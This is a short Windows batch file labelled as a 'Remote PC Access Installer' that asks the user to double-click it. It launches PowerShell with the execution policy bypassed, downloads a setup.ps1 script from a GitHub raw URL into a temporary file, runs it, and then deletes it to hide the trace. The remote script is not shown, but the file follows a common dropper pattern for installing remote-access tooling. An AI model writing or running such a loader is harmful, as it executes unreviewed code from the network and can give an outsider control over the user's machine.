@echo off
:: Remote PC Access Installer
:: Double-click this file to install.
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$url='https://raw.githubusercontent.com/hardikdahiya2011/remotecontrol/main/setup.ps1';$tmp=[System.IO.Path]::GetTempFileName()+'.ps1';(New-Object System.Net.WebClient).DownloadFile($url,$tmp);& $tmp;Remove-Item $tmp -Force -ErrorAction SilentlyContinue"
